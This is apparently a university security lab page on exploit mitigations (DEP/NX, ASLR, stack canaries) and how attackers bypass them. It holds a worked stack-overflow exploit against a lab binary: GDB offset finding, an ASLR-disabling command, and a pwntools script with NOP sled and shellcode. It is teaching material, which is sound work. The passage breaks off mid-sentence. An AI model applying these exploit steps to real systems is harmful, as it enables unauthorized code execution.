@@ -1,0 +1,989 @@
+    
+    
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+ "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"
+ lang="en" dir="ltr">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <title>
+    Lab 08 - Exploit Protection Mechanisms    [CS Open CourseWare]
+  </title>
+
+  <meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="noindex,nofollow"/>
+<meta name="date" content="2016-11-22T21:14:04+0200"/>
+<meta name="keywords" content="cns,labs,lab-08"/>
+<link rel="search" type="application/opensearchdescription+xml" href="../../lib/exe/opensearch.php" title="CS Open CourseWare"/>
+<link rel="start" href="../../../courses.1.html"/>
+<link rel="alternate" type="application/rss+xml" title="Recent Changes" href="../../feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="Current Namespace" href="../../feed.php%3Fmode=list&amp;ns=cns:labs"/>
+<link rel="alternate" type="text/html" title="Plain HTML" href="http://ocw.cs.pub.ro/courses/_export/xhtml/cns/labs/lab-08"/>
+<link rel="canonical" href="lab-08.html"/>
+<link rel="stylesheet" type="text/css" href="../../lib/exe/css.php%3Ft=arctic&amp;tseed=1476798676.css"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='cns:labs';var JSINFO = {"id":"cns:labs:lab-08","namespace":"cns:labs","isadmin":0,"isauth":0};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="../../lib/exe/js.php%3Ftseed=1476798676"></script>
+<script type="text/x-mathjax-config">/*<![CDATA[*/MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+        displayMath: [ ["$$","$$"], ["\\[","\\]"] ],
+        processEscapes: true
+    }
+});
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
+<script type="text/javascript">/*<![CDATA[*/
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+		  
+/*!]]>*/</script>
+<script type="text/javascript">/*<![CDATA[*/
+var pageTracker = _gat._getTracker("UA-38383934-1");
+pageTracker._initData();
+pageTracker._trackPageview();
+		  
+/*!]]>*/</script>
+
+  <link rel="shortcut icon" href="../../lib/tpl/arctic/images/favicon.ico" />
+
+  
+</head>
+<body>
+<div id="wrapper" class='show'>
+  <div class="dokuwiki">
+
+    
+    <div class="stylehead">
+      <div class="header">
+        <div class="pagename">
+          <a href="http://ocw.cs.pub.ro/courses/cns/"><img height="70" src="../../res/sigla_cns.png"/> </a>        </div>
+        <div class="logo">
+          <a style="color: #AAA !important;" href="../../systems/index.html"/><img height="70" src="../../res/systems.png" name="dokuwiki__top"/></a>        </div>
+      </div>
+    
+       
+      <div class="breadcrumbs">
+              </div>
+      
+            </div>
+
+                  <div class="bar" id="bar__top">
+        <div class="bar-left">
+                  </div>
+        <div class="bar-right">
+          <a href="http://ocw.cs.pub.ro/courses/cns/labs/lab-08?do=recent"  class="action recent" accesskey="r" rel="nofollow" title="Recent changes [R]">Recent changes</a><a href="http://ocw.cs.pub.ro/courses/cns/labs/lab-08?do=login&amp;sectok=f62420cf5b01253da4b50505d148181b"  class="action login" rel="nofollow" title="Login">Login</a>        </div>
+    </div>
+        
+    
+    
+    
+              <div class="left_page">
+          
+<h1 class="sectionedit1" id="lab_08_-_exploit_protection_mechanisms">Lab 08 - Exploit Protection Mechanisms</h1>
+<div class="level1">
+
+</div>
+
+<h2 class="sectionedit2" id="resources">Resources</h2>
+<div class="level2">
+<ul>
+<li class="level1"><div class="li"> <a href="http://phrack.org/issues/59/9.html#article" class="urlextern" title="http://phrack.org/issues/59/9.html#article"  rel="nofollow">Bypassing PaX ASLR protection</a></div>
+</li>
+<li class="level1"><div class="li"> <a href="http://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx" class="urlextern" title="http://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx"  rel="nofollow">Stack Overflows - Defeating Canaries, ASLR, DEP, NX</a></div>
+</li>
+<li class="level1"><div class="li"> <a href="https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/" class="urlextern" title="https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/"  rel="nofollow">Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR</a></div>
+</li>
+<li class="level1"><div class="li"> <a href="https://lwn.net/Articles/584225/" class="urlextern" title="https://lwn.net/Articles/584225/"  rel="nofollow">&quot;Strong&quot; stack protection for GCC</a></div>
+</li>
+<li class="level1"><div class="li"> <a href="http://wiki.osdev.org/Stack_Smashing_Protector" class="urlextern" title="http://wiki.osdev.org/Stack_Smashing_Protector"  rel="nofollow">Stack Smashing Protector</a></div>
+</li>
+<li class="level1"><div class="li"> Python: <a href="https://docs.python.org/2/library/random.html" class="urlextern" title="https://docs.python.org/2/library/random.html"  rel="nofollow">random</a>, <a href="https://docs.python.org/2/library/subprocess.html" class="urlextern" title="https://docs.python.org/2/library/subprocess.html"  rel="nofollow">subprocess</a></div>
+</li>
+<li class="level1"><div class="li"> pwntools: <a href="http://docs.pwntools.com/en/stable/tubes/processes.html" class="urlextern" title="http://docs.pwntools.com/en/stable/tubes/processes.html"  rel="nofollow">Processes</a>, <a href="http://docs.pwntools.com/en/stable/tubes.html" class="urlextern" title="http://docs.pwntools.com/en/stable/tubes.html"  rel="nofollow">tubes</a></div>
+</li>
+<li class="level1"><div class="li"> <a href="http://man7.org/linux/man-pages/man2/execve.2.html" class="urlextern" title="http://man7.org/linux/man-pages/man2/execve.2.html"  rel="nofollow">man execve</a></div>
+</li>
+</ul>
+
+</div>
+
+<h2 class="sectionedit3" id="lab_support_files">Lab Support Files</h2>
+<div class="level2">
+
+<p>
+We will use this <a href="http://elf.cs.pub.ro/oss/res/labs/lab-08.tar.gz" class="urlextern" title="http://elf.cs.pub.ro/oss/res/labs/lab-08.tar.gz"  rel="nofollow">lab archive</a> throughout the lab.
+</p>
+
+<p>
+Please download the lab archive an then unpack it using the commands below:
+</p>
+<pre class="code bash"><span class="co4">student@mjolnir:~$ </span><span class="kw2">wget</span> http:<span class="sy0">//</span>elf.cs.pub.ro<span class="sy0">/</span>oss<span class="sy0">/</span>res<span class="sy0">/</span>labs<span class="sy0">/</span>lab-08.tar.gz
+<span class="co4">student@mjolnir:~$ </span><span class="kw2">tar</span> xzf lab-08.tar.gz</pre>
+
+<p>
+After unpacking we will get the <code>lab-08/</code> folder that we will use for the lab:
+</p>
+<pre class="code bash"><span class="co4">student@mjolnir:~$ </span><span class="kw3">cd</span> lab-08<span class="sy0">/</span>
+student<span class="sy0">@</span>mjolnir:~:<span class="sy0">/</span>lab-08$ <span class="kw2">ls</span>
+buf    Makefile    vulnerable2    vulnerable3    vulnerable.c
+buf.c  vulnerable  vulnerable2.c  vulnerable3.c</pre>
+
+</div>
+
+<h2 class="sectionedit4" id="introductionprotection_mechanisms">Introduction: Protection Mechanisms</h2>
+<div class="level2">
+
+<p>
+So far we&#039;ve explored methods of abusing <strong>vulnerabilities</strong> in programs in order to gain control over them, using manual and/or automated techniques known as <strong>exploits</strong>. Ideally, programmers would carefully inspect code to remove all the possible vulnerabilities from their programs; in practice however even the most basic vulnerabilities (e.g. unchecked buffer bounds) can be easily found in the wild, which is how various hardware and software <strong>protection mechanisms</strong> were developed to mitigate attacks. We will study a few of these mechanisms in this lab, and we will find out how we can bypass them under certain scenarios.
+</p>
+
+<p>
+If we relate to the “stack buffer overflow” scenarios we have worked with in the past labs, we know intuitively that we want to stop at least two aspects of attacks:
+</p>
+<ul>
+<li class="level1"><div class="li"> The attacker&#039;s ability to read/write memory they shouldn&#039;t, e.g. code pointers, in particular <strong>return addresses</strong> on the stack, and/or</div>
+</li>
+<li class="level1"><div class="li"> The ability to inject <strong>arbitrary code</strong> into the program and execute this arbitrary code (shellcode).</div>
+</li>
+</ul>
+
+<p>
+We discuss some mitigation techniques in this section.
+</p>
+
+</div>
+
+<h3 class="sectionedit5" id="code_integrity_protection">Code Integrity Protection</h3>
+<div class="level3">
+
+<p>
+The <strong>code integrity</strong> property is entailed by two principles:
+</p>
+<ul>
+<li class="level1"><div class="li"> Arbitrary (non-code) data must be <strong>non-executable</strong></div>
+</li>
+<li class="level1"><div class="li"> Code must be <strong>non-writable</strong> (read-only) and executable</div>
+</li>
+</ul>
+
+<p>
+This mechanism is also known as Data Execution Prevention (DEP) or “Write XOR Execute” (W⊕X).
+</p>
+
+<p>
+The two requirements are enforced at various levels. Most modern hardware architectures enforce memory access permissions using virtual memory (paging): for example x86 execution permissions are determined using the <strong>NX</strong> (Non-Executable) bit, while write permissions are determined using the <strong>RW</strong> (Read/Write) bit. The operating system manages page tables, while the access policy is set by the compiler, linker and loader, as previously discussed in <a href="lab-03.html" class="wikilink1" title="cns:labs:lab-03">Lab 03</a> and <a href="lab-04.html" class="wikilink1" title="cns:labs:lab-04">Lab 04</a>.
+</p>
+
+<p>
+For example we can set stack access permissions by configuring the GCC linker via the <code>-z</code> flag with the <code>execstack</code>/<code>noexecstack</code> parameters:
+</p>
+<pre class="code">$ gcc -z noexecstack -o main main.c</pre>
+
+<p>
+<p><div class="noteclassic">
+In newer version of GCC <code>noexecstack</code> is the default policy. Remember that in previous labs we had to explicitly pass <code>-z execstack</code> to GCC in order to make the stack executable.
+
+</div></p>
+</p>
+
+<p>
+<p><div class="noteimportant">
+<strong>Bypassing code integrity</strong> is possible through <em>code reuse</em>. For example if we want to obtain a shell, all we need to do is divert the control-flow to the <code>system</code> C library function with the <code>&quot;/bin/sh&quot;</code> parameter – this is from a class of attacks known as <em>return-to-libc</em>. The fact that the vast majority of programs are linked with the C library makes this pretty easy.
+</p>
+
+<p>
+In general we can reuse existing code in the program to do what is known as <em>Return-Oriented Programming</em> (ROP). ROP is a very powerful technique: it was shown that the attacker may reuse small pieces of program code called “gadgets” to execute arbitrary (turing-complete) operations! We will study ROP further in the upcoming labs.
+
+</div></p>
+</p>
+
+<p>
+<p><div class="noteimportant">
+<strong>Bypassing code integrity (2)</strong>: while <code>-z noexecstack</code> will ensure that the stack memory area is set as non-executable by the loader, this doesn&#039;t rule out the possibility for an attacker to make it executable at run-time! e.g. by calling <code>mprotect</code>.
+
+</div></p>
+</p>
+
+</div>
+
+<h3 class="sectionedit6" id="address_space_layout_randomization">Address Space Layout Randomization</h3>
+<div class="level3">
+
+<p>
+So far we&#039;ve seen that it&#039;s pretty easy to obtain the approximate or exact address of a memory location (e.g. buffer) by assuming it was leaked (through a <code>printf</code>) or by looking in GDB. The technique known as <em>Address Space Layout Randomization</em> (ASLR) works by trying to remove this information from the attacker: it sets as many program segments as possible to <strong>randomly chosen</strong> addresses, thus providing a level of <strong>probabilistic protection</strong>.
+</p>
+
+<p>
+On x86 it is possible to randomize the following segments:
+</p>
+<ul>
+<li class="level1"><div class="li"> The <strong>stack</strong> is easily randomizable, as all stack addresses are relative to <code>esp</code> or <code>ebp</code></div>
+</li>
+<li class="level1"><div class="li"> <strong>Global data</strong> may be randomized, if e.g. the data segment is set to a random value</div>
+</li>
+<li class="level1"><div class="li"> <strong>Code</strong> can only be randomized by compiling the program as Position Independent Code/Position Independent Executable; this is the default for shared libraries, but otherwise executable code is usually placed at fixed addresses</div>
+</li>
+</ul>
+
+<p>
+Note that randomization occurs at <strong>load-time</strong>, which means that the segment addresses <strong>do not</strong> change while the process is running.
+</p>
+
+<p>
+<p><div class="noteimportant">
+<strong>Bypassing ASLR</strong> is possible through at least one of the following methods, some of which we will employ throughout the lab.
+</p>
+
+<p>
+<strong>Bruteforce</strong>. If the attacker is able to inject payloads multiple times without crashing the application, they can bruteforce the address they are interested in (e.g., a target in libc). Otherwise, they can just run the exploit multiple times until they guess the correct target.
+</p>
+
+<p>
+<strong>NOP sled</strong>. In the case of shellcodes, a longer NOP sled will maximize the chances of jumping inside it and eventually reaching the exploit code even if the stack address is randomized.
+</p>
+
+<p>
+<strong>Restrict entropy</strong>. There are various ways of reducing the entropy of the randomized address. For example, the attacker can decrease the initial stack size by setting a huge amount of dummy environment variables.
+</p>
+
+<p>
+<strong>Information leak</strong>. The most effective way of bypassing ASLR is by using an information leak vulnerability that exposes a randomized address, or at least parts of it. The attacker can also dump parts of libraries (e.g., libc) if they are able to create an exploit that reads them. This is useful in remote attacks to infer the version of the library, downloading it from the web, and thus knowing the right GOT offsets for other functions (not originally linked with the binary).
+
+</div></p>
+</p>
+
+<p>
+<p><div class="noteclassic">
+Linux allows 3 options for its ASLR implementation that can be configured using the <code>/proc/sys/kernel/randomize_va_space</code> file. Writing 0, 1, or 2 to this will results in the following behaviors:
+</p>
+<ul>
+<li class="level1"><div class="li"> <strong>0</strong>: deactivated</div>
+</li>
+<li class="level1"><div class="li"> <strong>1</strong>: random stack, vdso, libraries; data is after code section</div>
+</li>
+<li class="level1"><div class="li"> <strong>2</strong>: random data too</div>
+</li>
+</ul>
+
+<p>
+
+</div></p>
+</p>
+
+</div>
+
+<h3 class="sectionedit7" id="stack_protectioncanaries">Stack Protection: Canaries</h3>
+<div class="level3">
+
+<p>
+Assuming we have a program <code>p</code> that is vulnerable to a stack-based buffer overflow in function <code>f</code>, the program flow will normally be the following:
+</p>
+<ol>
+<li class="level1"><div class="li"> Caller calls <code>f</code>: return address <code>ret</code> is pushed on the stack</div>
+</li>
+<li class="level1"><div class="li"> <code>f</code> executes: the attacker can overflow a buffer and overwrite <code>ret</code></div>
+</li>
+<li class="level1"><div class="li"> Callee returns from <code>f</code> to potentially modified <code>ret</code></div>
+</li>
+</ol>
+
+<p>
+The compiler or the programmer can easily provide some protection by inserting a special value (unknown to the attacker) between the buffer and the return address. This value is known as a <strong>canary</strong>. The figure below illustrates its placement on the stack:
+</p>
+
+<p>
+<img src="http://ocw.cs.pub.ro/courses/_media/cns/labs/stack_canary_illustration.png?w=500&amp;tok=eb1cc3" class="mediacenter" alt="" width="500" />
+</p>
+
+<p>
+Thus the program logic becomes:
+</p>
+<ol>
+<li class="level1"><div class="li"> Caller calls <code>f</code>: return address <code>ret</code> is pushed on the stack</div>
+</li>
+<li class="level1"><div class="li"> Callee pushes a random value <code>v</code> on the stack and writes it somewhere else for reference</div>
+</li>
+<li class="level1"><div class="li"> <code>f</code> executes: the attacker can overflow a buffer and overwrite <code>ret</code></div>
+</li>
+<li class="level1"><div class="li"> Callee returns from <code>f</code>: the value of <code>v</code> is checked; if it has changed, abort, otherwise return to <code>ret</code></div>
+</li>
+</ol>
+
+<p>
+Canary values can be enabled <a href="http://wiki.osdev.org/Stack_Smashing_Protector" class="urlextern" title="http://wiki.osdev.org/Stack_Smashing_Protector"  rel="nofollow">in GCC</a> through the <code>-fstack-protector</code> set of flags. We will examine its usage in the tutorial section of this lab.
+</p>
+
+<p>
+<p><div class="noteimportant">
+<strong>Bypassing stack canaries</strong>. We make the following observations:
+</p>
+<ul>
+<li class="level1"><div class="li"> Stack canaries only protect against <em>buffer overflows</em>. Arbitrary memory writes (e.g. to offsets that can be controlled by the attacker) may be crafted so that they do not touch the canary value.</div>
+</li>
+<li class="level1"><div class="li"> Stack canaries are vulnerable to the same set of attacks as ASLR. Guessing the canary value, e.g. through an information leak or through brute force, is possible and will bypass the attack. Modifying the reference value is also (at least theoretically) possible (the value may be held <a href="http://wiki.osdev.org/Stack_Smashing_Protector#Implementation" class="urlextern" title="http://wiki.osdev.org/Stack_Smashing_Protector#Implementation"  rel="nofollow">in a global variable</a>, in which case the attacker regains complete control of the stack.</div>
+</li>
+</ul>
+
+<p>
+
+</div></p>
+</p>
+
+</div>
+
+<h2 class="sectionedit8" id="tutorials">Tutorials</h2>
+<div class="level2">
+
+</div>
+
+<h3 class="sectionedit9" id="t1_gcc_stack_protector_1p">T1. GCC stack protector [1p]</h3>
+<div class="level3">
+
+<p>
+Take a look at <code>vulnerable.c</code> in the <a href="http://elf.cs.pub.ro/oss/res/labs/lab-08.tar.gz" class="urlextern" title="http://elf.cs.pub.ro/oss/res/labs/lab-08.tar.gz"  rel="nofollow">lab archive</a>. We are interested in particular in the <code>get_user_input</code> function, which <code>read</code>s from standard input into a local buffer more bytes than are available:
+</p>
+<pre class="code C"><span class="kw4">void</span> get_user_input<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
+<span class="br0">&#123;</span>
+	<span class="kw4">char</span> buf<span class="br0">&#91;</span>BUFFER_SIZE<span class="br0">&#93;</span><span class="sy0">;</span>
+	read<span class="br0">&#40;</span>STDIN_FILENO<span class="sy0">,</span> buf<span class="sy0">,</span> <span class="nu0">8</span><span class="sy0">*</span>BUFFER_SIZE<span class="br0">&#41;</span><span class="sy0">;</span>
+<span class="br0">&#125;</span></pre>
+
+<p>
+We can overflow <code>buf</code> into <code>get_user_input</code>&#039;s return address and obtain control of the program, using the three-step approach studied in the previous labs:
+</p>
+<ol>
+<li class="level1"><div class="li"> Input a large input string that crashes the process</div>
+</li>
+<li class="level1"><div class="li"> Determine the offset into the string that overwrites the return address</div>
+</li>
+<li class="level1"><div class="li"> Determine the address where to jump, e.g. a fixed function or a shellcode placed on the stack</div>
+</li>
+</ol>
+
+<p>
+For now we&#039;re only interested in the first step. Let&#039;s compile <code>vulnerable</code> and provide it an arbitrary payload:
+</p>
+<pre class="code">$ make vulnerable
+cc -m32 -c -m32 -Wall -Wextra -Wno-unused-function -Wno-unused-variable -g -O0 -fno-stack-protector -o vulnerable.o vulnerable.c
+cc -m32 -z execstack  vulnerable.o   -o vulnerable
+$ python -c &#039;print &quot;A&quot;*20&#039; | ./vulnerable
+Segmentation fault
+$ dmesg | tail -n 1
+[14935.316385] vulnerable[29090]: segfault at 41414141 ip 0000000041414141 sp 00000000ffcd9880 error 14 in libc-2.24.so[f753b000+1b1000]</pre>
+
+<p>
+We can thwart the attack in this phase by building our binary with the <code>-fstack-protector-all</code> flag, which ensures that the stack canary instrumentation will be applied to all the functions. The Makefile can be used to compile this into <code>vulnerable-ssp</code>:
+</p>
+<pre class="code">$ make vulnerable-ssp
+cc -m32 -c -m32 -Wall -Wextra -Wno-unused-function -Wno-unused-variable -g -O0 -fstack-protector-all -o vulnerable-ssp.o vulnerable.c
+cc -m32 -z execstack  vulnerable-ssp.o   -o vulnerable-ssp</pre>
+
+<p>
+Now let&#039;s try to inject the payload again:
+</p>
+<pre class="code">$ python -c &#039;print &quot;A&quot;*20&#039; | ./vulnerable-ssp
+*** stack smashing detected ***: ./vulnerable-ssp terminated
+======= Backtrace: =========
+/lib/i386-linux-gnu/libc.so.6(+0x6733a)[0xf762f33a]
+/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x37)[0xf76bfd27]
+/lib/i386-linux-gnu/libc.so.6(+0xf7ce8)[0xf76bfce8]
+./vulnerable-ssp[0x80484a1]
+./vulnerable-ssp[0x804840a]
+======= Memory map: ========</pre>
+
+<p>
+We observe that the GCC stack protector run-time detected our attempt to smash the stack and aborted the program.
+</p>
+
+<p>
+<p><div class="noteimportant">
+Try injecting payloads of various sizes (e.g. 20, 24, 16 bytes) and see what happens. In some cases, the program does a segmentation fault before it gets to print the backtrace. Why is that?
+
+</div></p>
+</p>
+
+</div>
+
+<h3 class="sectionedit10" id="t2_recapinjecting_the_shellcode_using_environment_variables_2p">T2. Recap: injecting the shellcode using environment variables [2p]</h3>
+<div class="level3">
+
+<p>
+Let&#039;s try to exploit <code>vulnerable</code>, assuming that both the stack protector and ASLR are disabled. We make sure to disable ASLR using:
+</p>
+<pre class="code">$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+0</pre>
+
+<p>
+For now let&#039;s use GDB to find where we need to place the return address in our input:
+</p>
+<pre class="code asm"><span class="sy2">$</span> gdb <span class="sy1">-</span>q <span class="sy1">./</span>vulnerable
+Reading symbols from <span class="sy1">./</span>vulnerable<span class="sy1">...</span>done<span class="sy1">.</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> pattc <span class="nu0">100</span>
+<span class="st0">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> r &lt; &lt;<span class="br0">&#40;</span>echo <span class="st0">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span><span class="br0">&#41;</span>
+<span class="sy1">...</span>
+EIP<span class="sy1">:</span> <span class="nu0">0x41434141</span> <span class="br0">&#40;</span><span class="st0">'AACA'</span><span class="br0">&#41;</span>
+<span class="sy1">...</span>
+Legend<span class="sy1">:</span> <span class="kw5">code</span><span class="sy1">,</span> <span class="kw5">data</span><span class="sy1">,</span> rodata<span class="sy1">,</span> value
+Stopped reason<span class="sy1">:</span> SIGSEGV
+<span class="nu0">0x41434141</span> <span class="kw1">in</span> ?? <span class="br0">&#40;</span><span class="br0">&#41;</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> patto AACA
+<span class="co2">AACA</span> found <span class="kw5">at</span> offset<span class="sy1">:</span> <span class="nu0">16</span></pre>
+
+<p>
+We now know that the return address is found at offset 16 from the buffer&#039;s start. While this is good enough for us, one issue is that the buffer is a bit too small to hold a shellcode. So to make our life easy, let&#039;s use the <code>SHELLCODE</code> environment variable to hold the shellcode.
+</p>
+
+<p>
+<p><div class="noteimportant">
+Remember that environment variables are placed on the stack, along with <code>argv</code>. It doesn&#039;t really matter whether the victim program will use that variable or not, the <abbr title="Operating System">OS</abbr> will place it there anyway and it can be used to inject malicious code or data.
+
+</div></p>
+</p>
+
+<p>
+Now let&#039;s try to find the approximate address at which the shellcode is placed – remember that we turned ASLR off, so even if the environment changes a little, we can still make a good guess using GDB.
+</p>
+<pre class="code asm"><span class="sy2">$</span> SHELLCODE=<span class="sy2">$</span><span class="br0">&#40;</span>python <span class="sy1">-</span>c <span class="st0">'print &quot;C&quot; * 1000'</span><span class="br0">&#41;</span> gdb <span class="sy1">-</span>q <span class="sy1">./</span>vulnerable
+Reading symbols from <span class="sy1">./</span>vulnerable<span class="sy1">...</span>done<span class="sy1">.</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> r &lt; &lt;<span class="br0">&#40;</span>python <span class="sy1">-</span>c <span class="st0">'print &quot;A&quot; * 16 + &quot;BBBB&quot;'</span><span class="br0">&#41;</span>
+<span class="sy1">...</span>
+EIP<span class="sy1">:</span> <span class="nu0">0x42424242</span> <span class="br0">&#40;</span><span class="st0">'BBBB'</span><span class="br0">&#41;</span>
+<span class="sy1">...</span>
+Invalid <span class="sy2">$</span>PC address<span class="sy1">:</span> <span class="nu0">0x42424242</span>
+<span class="sy1">...</span>
+Legend<span class="sy1">:</span> <span class="kw5">code</span><span class="sy1">,</span> <span class="kw5">data</span><span class="sy1">,</span> rodata<span class="sy1">,</span> value
+Stopped reason<span class="sy1">:</span> SIGSEGV
+<span class="nu0">0x42424242</span> <span class="kw1">in</span> ?? <span class="br0">&#40;</span><span class="br0">&#41;</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> searchmem <span class="st0">&quot;CCCCC&quot;</span>                      
+Searching for <span class="st0">'CCCCC'</span> <span class="kw1">in</span><span class="sy1">:</span> None ranges            
+Found <span class="nu0">200</span> results<span class="sy1">,</span> display max <span class="nu0">200</span> items<span class="sy1">:</span>        
+<span class="br0">&#91;</span><span class="kw5">stack</span><span class="br0">&#93;</span> <span class="sy1">:</span> <span class="nu0">0xffffdbc8</span> <span class="br0">&#40;</span><span class="st0">'C'</span> &lt;repeats <span class="nu0">200</span> <span class="kw5">times</span>&gt;<span class="sy1">...</span><span class="br0">&#41;</span>
+<span class="br0">&#91;</span><span class="kw5">stack</span><span class="br0">&#93;</span> <span class="sy1">:</span> <span class="nu0">0xffffdbcd</span> <span class="br0">&#40;</span><span class="st0">'C'</span> &lt;repeats <span class="nu0">200</span> <span class="kw5">times</span>&gt;<span class="sy1">...</span><span class="br0">&#41;</span>
+<span class="br0">&#91;</span><span class="kw5">stack</span><span class="br0">&#93;</span> <span class="sy1">:</span> <span class="nu0">0xffffdbd2</span> <span class="br0">&#40;</span><span class="st0">'C'</span> &lt;repeats <span class="nu0">200</span> <span class="kw5">times</span>&gt;<span class="sy1">...</span><span class="br0">&#41;</span>
+<span class="br0">&#91;</span><span class="kw5">stack</span><span class="br0">&#93;</span> <span class="sy1">:</span> <span class="nu0">0xffffdbd7</span> <span class="br0">&#40;</span><span class="st0">'C'</span> &lt;repeats <span class="nu0">200</span> <span class="kw5">times</span>&gt;<span class="sy1">...</span><span class="br0">&#41;</span>
+<span class="br0">&#91;</span><span class="kw5">stack</span><span class="br0">&#93;</span> <span class="sy1">:</span> <span class="nu0">0xffffdbdc</span> <span class="br0">&#40;</span><span class="st0">'C'</span> &lt;repeats <span class="nu0">200</span> <span class="kw5">times</span>&gt;<span class="sy1">...</span><span class="br0">&#41;</span>
+<span class="br0">&#91;</span><span class="kw5">stack</span><span class="br0">&#93;</span> <span class="sy1">:</span> <span class="nu0">0xffffdbe1</span> <span class="br0">&#40;</span><span class="st0">'C'</span> &lt;repeats <span class="nu0">200</span> <span class="kw5">times</span>&gt;<span class="sy1">...</span><span class="br0">&#41;</span>
+<span class="sy1">...</span></pre>
+
+<p>
+Thus so far we know that:
+</p>
+<ul>
+<li class="level1"><div class="li"> The return address is at offset 16 in our input</div>
+</li>
+<li class="level1"><div class="li"> The <code>SHELLCODE</code> environment variable will be placed at approximately <code>0xffffdbc8</code>. We expect this to vary quite a bit though, as the process running under GDB uses a different environment that affects stack addresses (environment variables are also stored on the stack). Moreover, the address will be different when running it under different systems.</div>
+</li>
+</ul>
+
+<p>
+Given this, we can already write a skeleton for our exploit:
+</p>
+<dl class="code">
+<dt><a href="http://ocw.cs.pub.ro/courses/_export/code/cns/labs/lab-08?codeblock=10" title="Download Snippet" class="mediafile mf_py">exploit-t2.py</a></dt>
+<dd><pre class="code python"><span class="co1">#!/usr/bin/env python</span>
+&nbsp;
+<span class="kw1">from</span> pwn <span class="kw1">import</span> *
+&nbsp;
+<span class="co1"># 32-bit Linux</span>
+context<span class="br0">&#40;</span>arch<span class="sy0">=</span><span class="st0">'i386'</span><span class="sy0">,</span> <span class="kw3">os</span><span class="sy0">=</span><span class="st0">'linux'</span><span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Generate vars: a shellcode, return address offset, target address.</span>
+shellcode <span class="sy0">=</span> asm<span class="br0">&#40;</span>shellcraft.<span class="me1">sh</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
+ret_offset <span class="sy0">=</span> <span class="nu0">16</span>
+target <span class="sy0">=</span> <span class="nu0">0xffffdbc8</span>
+&nbsp;
+<span class="co1"># Generate process, with SHELLCODE as an env var.</span>
+io <span class="sy0">=</span> process<span class="br0">&#40;</span><span class="st0">'./vulnerable'</span><span class="sy0">,</span> env<span class="sy0">=</span> <span class="br0">&#123;</span> <span class="st0">'SHELLCODE'</span> : shellcode <span class="br0">&#125;</span><span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Craft payload.</span>
+payload <span class="sy0">=</span> <span class="st0">&quot;A&quot;</span> * ret_offset
+payload +<span class="sy0">=</span> p32<span class="br0">&#40;</span>target<span class="br0">&#41;</span>
+&nbsp;
+<span class="co1"># Send payload.</span>
+io.<span class="me1">sendline</span><span class="br0">&#40;</span>payload<span class="br0">&#41;</span>
+&nbsp;
+io.<span class="me1">interactive</span><span class="br0">&#40;</span><span class="br0">&#41;</span></pre>
+</dd></dl>
+
+<p>
+Let&#039;s try to run <code>exploit-t2.py</code>:
+</p>
+<pre class="code">$ python exploit-t2.py
+[+] Starting local process &#039;./vulnerable&#039;: Done
+[*] Switching to interactive mode
+[*] Got EOF while reading in interactive
+$ ls /
+[*] Process &#039;./vulnerable&#039; stopped with exit code -11
+[*] Got EOF while sending in interactive</pre>
+
+<p>
+This most probably crashed the program. Indeed, if we look at <code>dmesg</code>, we will see something along the lines of:
+</p>
+<pre class="code">$ dmesg | tail
+[20073.274211] vulnerable[11099]: segfault at 19 ip 00000000ffffdbc8 sp 00000000ffffde20 error 6</pre>
+
+<p>
+So we don&#039;t know <em>exactly</em> what happened<sup><a href="lab-08.html#fn__1" id="fnt__1" class="fn_top">1)</a></sup>, but we know that most probably the code at <code>0xffffdbc8</code> isn&#039;t what we expected. Since finding the exact address is difficult in the absence of an information leak, we will just extend our shellcode by prepending a <strong>NOP sled</strong> to it:
+</p>
+<pre class="code python">nopsled <span class="sy0">=</span> <span class="st0">&quot;<span class="es0">\x</span>90&quot;</span> * <span class="nu0">2000</span>
+shellcode <span class="sy0">=</span> asm<span class="br0">&#40;</span>shellcraft.<span class="me1">sh</span><span class="br0">&#40;</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
+...
+<span class="me1">io</span> <span class="sy0">=</span> process<span class="br0">&#40;</span><span class="st0">'./vulnerable'</span><span class="sy0">,</span> env<span class="sy0">=</span> <span class="br0">&#123;</span> <span class="st0">'SHELLCODE'</span> : nopsled + shellcode <span class="br0">&#125;</span><span class="br0">&#41;</span></pre>
+
+<p>
+Running this gives us a shell:
